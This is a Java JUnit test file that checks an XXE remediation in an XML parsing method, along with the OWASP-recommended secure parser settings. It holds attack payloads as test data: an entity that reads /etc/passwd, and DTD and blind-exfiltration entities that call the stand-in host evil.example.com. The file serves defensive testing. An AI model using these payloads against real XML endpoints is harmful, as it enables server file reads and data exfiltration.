import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import javax.servlet.http.HttpServletRequest;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.when;

/**
 * Tests for the XXE (XML External Entity) remediation in AdditionalSastCases.parseXml().
 *
 * CWE-611: Improper Restriction of XML External Entity Reference.
 *
 * The fix disables DTD declarations and external entity resolution on the
 * DocumentBuilderFactory so an attacker-supplied XML document cannot read
 * arbitrary files from the server or initiate out-of-band network requests.
 */
@ExtendWith(MockitoExtension.class)
public class AdditionalSastCasesXxeTest {

    @Mock
    private HttpServletRequest request;

    private AdditionalSastCases subject;

    @BeforeEach
    void setUp() {
        subject = new AdditionalSastCases();
    }

    // -----------------------------------------------------------------------
    // Positive / functional tests
    // -----------------------------------------------------------------------

    /**
     * A well-formed XML document without any DTD or entity references must be
     * parsed successfully — the fix must not break valid input.
     */
    @Test
    void parseXml_validXml_doesNotThrow() {
        String validXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><item>value</item></root>";
        when(request.getParameter("xml")).thenReturn(validXml);

        assertDoesNotThrow(() -> subject.parseXml(request),
                "Valid XML without DTD should be parsed without error");
    }

    /**
     * Parsing a minimal well-formed document should succeed.
     */
    @Test
    void parseXml_minimalWellFormedXml_doesNotThrow() {
        String minimalXml = "<a/>";
        when(request.getParameter("xml")).thenReturn(minimalXml);

        assertDoesNotThrow(() -> subject.parseXml(request),
                "Minimal well-formed XML should be parsed without error");
    }

    // -----------------------------------------------------------------------
    // Security / negative tests — XXE attack vectors must be rejected
    // -----------------------------------------------------------------------

    /**
     * An XML document that declares a DOCTYPE (DTD) must be rejected.
     * The "disallow-doctype-decl" feature causes the parser to throw when any
     * DOCTYPE declaration is encountered — before any entity is resolved.
     *
     * This covers the classic file-read XXE payload:
     *   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     *   <root>&xxe;</root>
     */
    @Test
    void parseXml_xxeWithFileSystemEntity_throwsOnDoctypeDecl() {
        // Attack payload: attempt to read /etc/passwd via a SYSTEM entity
        String xxePayload =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
                "<root>&xxe;</root>";

        when(request.getParameter("xml")).thenReturn(xxePayload);

        assertThrows(Exception.class, () -> subject.parseXml(request),
                "XXE payload with DOCTYPE/SYSTEM entity must be rejected");
    }

    /**
     * An XML document with a PUBLIC entity reference must also be rejected —
     * the DOCTYPE is still present and disallow-doctype-decl fires first.
     */
    @Test
    void parseXml_xxeWithPublicEntity_throwsOnDoctypeDecl() {
        String xxePayload =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE foo PUBLIC \"-//OWASP//DTD Test//EN\" \"http://evil.example.com/evil.dtd\">" +
                "<root>test</root>";

        when(request.getParameter("xml")).thenReturn(xxePayload);

        assertThrows(Exception.class, () -> subject.parseXml(request),
                "XXE payload with DOCTYPE/PUBLIC entity must be rejected");
    }

    /**
     * An XML document using a parameter entity (used in blind XXE attacks) must
     * also be rejected because the DOCTYPE itself is disallowed.
     */
    @Test
    void parseXml_xxeBlindParameterEntity_throwsOnDoctypeDecl() {
        // Blind XXE: exfiltrate data via an out-of-band HTTP request
        String xxePayload =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example.com/evil.dtd\"> %xxe;]>" +
                "<root>test</root>";

        when(request.getParameter("xml")).thenReturn(xxePayload);

        assertThrows(Exception.class, () -> subject.parseXml(request),
                "Blind XXE with parameter entity must be rejected");
    }

    // -----------------------------------------------------------------------
    // Configuration-level verification
    // -----------------------------------------------------------------------

    /**
     * Verify that the OWASP-recommended secure configuration is active on the
     * DocumentBuilderFactory independently of the servlet wrapper — this lets
     * us confirm the factory settings in isolation.
     */
    @Test
    void documentBuilderFactory_secureConfiguration_disablesDtdAndExternalEntities()
            throws Exception {

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        // Factory should build without error
        DocumentBuilder builder = factory.newDocumentBuilder();
        assertNotNull(builder, "DocumentBuilder should be created with secure settings");

        // Valid XML must still parse correctly
        String validXml = "<root><child>text</child></root>";
        assertDoesNotThrow(
                () -> builder.parse(new ByteArrayInputStream(validXml.getBytes())),
                "Valid XML must still parse with secure factory settings");
    }

    /**
     * Confirm that the secure factory rejects a DOCTYPE-containing document,
     * proving the feature flag is honoured by the JVM's XML implementation.
     */
    @Test
    void documentBuilderFactory_secureConfiguration_rejectsDoctypeDeclaration()
            throws Exception {

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();

        String xxePayload =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
                "<root>&xxe;</root>";

        assertThrows(Exception.class,
                () -> builder.parse(new ByteArrayInputStream(xxePayload.getBytes())),
                "Secure factory must throw when DOCTYPE declaration is encountered");
    }
}
